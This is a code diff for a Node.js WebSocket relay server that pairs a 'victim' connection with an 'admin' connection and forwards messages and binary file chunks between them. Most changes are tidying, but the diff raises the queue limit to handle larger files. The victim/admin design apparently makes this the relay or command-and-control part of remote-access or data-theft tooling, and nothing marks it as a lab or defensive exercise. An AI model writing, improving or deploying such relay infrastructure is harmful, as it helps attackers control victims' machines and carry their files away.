@@ -1,4 +1,3 @@
-
 const express = require("express");
 const http = require("http");
 const WebSocket = require("ws");
@@ -12,13 +11,11 @@ const server = http.createServer(app);
 
 const PORT = process.env.PORT || 10000;
 
-// Maximum individual WebSocket message.
-// This is NOT the maximum total file size.
+// Maximum individual WebSocket message (2MB)
 const MAX_MESSAGE_SIZE = 2 * 1024 * 1024;
 
-// Maximum queued data per receiving socket.
-// Keeps memory usage bounded.
-const MAX_QUEUE_BYTES = 16 * 1024 * 1024;
+// Maximum queued data per receiving socket (32MB to support larger files)
+const MAX_QUEUE_BYTES = 32 * 1024 * 1024;
 
 // Heartbeat interval
 const HEARTBEAT_INTERVAL = 30000;
@@ -67,14 +64,11 @@ app.get("/", (req, res) => {
 // ============================================
 
 function isConnected(socket) {
-    return socket &&
-        socket.readyState === WebSocket.OPEN;
+    return socket && socket.readyState === WebSocket.OPEN;
 }
 
 function getSocket(role) {
-    return role === "victim"
-        ? victimSocket
-        : adminSocket;
+    return role === "victim" ? victimSocket : adminSocket;
 }
 
 function setSocket(role, socket) {
@@ -92,11 +86,10 @@ function clearSocket(role, socket) {
 }
 
 // ============================================
-// SAFE MESSAGE QUEUE
+// SAFE MESSAGE QUEUE (FIXED BYTE LENGTH EVAL)
 // ============================================
 
 function enqueueMessage(target, data, isBinary, sender) {
-
     if (!isConnected(target)) {
         return false;
     }
@@ -109,24 +102,17 @@ function enqueueMessage(target, data, isBinary, sender) {
             queuedBytes: 0,
             sending: false
         };
-
         sendQueues.set(target, queue);
     }
 
-    const size = data.length;
+    // Safely compute precise byte length whether buffer or string
+    const size = Buffer.isBuffer(data) ? data.length : Buffer.byteLength(data);
 
-    // Prevent unlimited memory growth if the
-    // receiving client cannot keep up.
     if (queue.queuedBytes + size > MAX_QUEUE_BYTES) {
-
-        console.warn(
-            "Outbound queue full. Closing slow sender."
-        );
-
-        if (isConnected(sender)) {
-            sender.close(1013, "Receiver is too slow");
+        console.warn("Outbound queue full. Closing slow receiver.");
+        if (isConnected(target)) {
+            target.close(1013, "Receiver queue overflow");
         }
-
         return false;
     }
 
@@ -137,14 +123,12 @@ function enqueueMessage(target, data, isBinary, sender) {
     });
 
     queue.queuedBytes += size;
-
     processQueue(target, queue);
 
     return true;
 }
 
 function processQueue(target, queue) {
-
     if (queue.sending || !isConnected(target)) {
         return;
     }
@@ -161,16 +145,11 @@ function processQueue(target, queue) {
         item.data,
         { binary: item.isBinary },
         (error) => {
-
             queue.sending = false;
             queue.queuedBytes -= item.size;
 
             if (error) {
-                console.error(
-                    "Message forwarding failed:",
-                    error.message
-                );
-
+                console.error("Message forwarding failed:", error.message);
                 target.terminate();
                 return;
             }
@@ -185,9 +164,7 @@ function processQueue(target, queue) {
 // ============================================
 
 function forwardMessage(sender, data, isBinary) {
-
     const role = sender.role;
-
     let receiver = null;
 
     if (role === "victim") {
@@ -200,12 +177,7 @@ function forwardMessage(sender, data, isBinary) {
         return;
     }
 
-    enqueueMessage(
-        receiver,
-        data,
-        isBinary,
-        sender
-    );
+    enqueueMessage(receiver, data, isBinary, sender);
 }
 
 // ============================================
@@ -213,7 +185,6 @@ function forwardMessage(sender, data, isBinary) {
 // ============================================
 
 wss.on("connection", (ws, req) => {
-
     const url = new URL(
         req.url,
         `http://${req.headers.host || "localhost"}`
@@ -221,11 +192,8 @@ wss.on("connection", (ws, req) => {
 
     const role = url.searchParams.get("role");
 
-    // Validate role
     if (role !== "victim" && role !== "admin") {
-
         ws.close(1008, "Invalid role");
-
         return;
     }
 
@@ -234,72 +202,31 @@ wss.on("connection", (ws, req) => {
 
     console.log(`${role} connected`);
 
-    // Replace any existing connection for this role.
     const existingSocket = getSocket(role);
-
     if (isConnected(existingSocket)) {
-        existingSocket.close(
-            1000,
-            "Replaced by a new connection"
-        );
+        existingSocket.close(1000, "Replaced by a new connection");
     }
 
     setSocket(role, ws);
-
-    // ========================================
-    // HEARTBEAT
-    // ========================================
 
     ws.on("pong", () => {
         ws.isAlive = true;
     });
 
-    // ========================================
-    // MESSAGE HANDLING
-    // ========================================
-
     ws.on("message", (data, isBinary) => {
-
         if (!isConnected(ws)) {
             return;
         }
-
-        // File chunks are binary messages.
-        // The server forwards them without
-        // buffering the entire file or decoding
-        // the binary data.
-        forwardMessage(
-            ws,
-            data,
-            isBinary
-        );
+        forwardMessage(ws, data, isBinary);
     });
-
-    // ========================================
-    // ERROR HANDLING
-    // ========================================
 
     ws.on("error", (error) => {
-
-        console.error(
-            `${role} socket error:`,
-            error.message
-        );
+        console.error(`${role} socket error:`, error.message);
     });
 
-    // ========================================
-    // DISCONNECTION
-    // ========================================
-
     ws.on("close", (code, reason) => {
-
         clearSocket(role, ws);
-
-        console.log(
-            `${role} disconnected:`,
-            code,
-            reason.toString()
-        );
+        console.log(`${role} disconnected:`, code, reason.toString());
     });
 });
 
@@ -308,27 +235,17 @@ wss.on("connection", (ws, req) => {
 // ============================================
 
 const heartbeatTimer = setInterval(() => {
-
     wss.clients.forEach((ws) => {
-
         if (!ws.isAlive) {
-
-            console.log(
-                `${ws.role} heartbeat timeout`
-            );
-
+            console.log(`${ws.role} heartbeat timeout`);
             ws.terminate();
-
             return;
         }
-
         ws.isAlive = false;
-
         if (isConnected(ws)) {
             ws.ping();
         }
     });
-
 }, HEARTBEAT_INTERVAL);
 
 // ============================================
@@ -336,10 +253,7 @@ const heartbeatTimer = setInterval(() => {
 // ============================================
 
 server.listen(PORT, () => {
-
-    console.log(
-        `WebSocket server running on port ${PORT}`
-    );
+    console.log(`WebSocket server running on port ${PORT}`);
 });
 
 // ============================================
@@ -347,23 +261,16 @@ server.listen(PORT, () => {
 // ============================================
 
 function shutdown() {
-
     console.log("Shutting down server...");
-
     clearInterval(heartbeatTimer);
-
     wss.clients.forEach((ws) => {
         ws.close(1001, "Server shutting down");
     });
-
     wss.close(() => {
-
         server.close(() => {
             process.exit(0);
         });
     });
-
-    // Avoid hanging indefinitely during shutdown.
     setTimeout(() => {
         process.exit(1);
     }, 10000).unref();
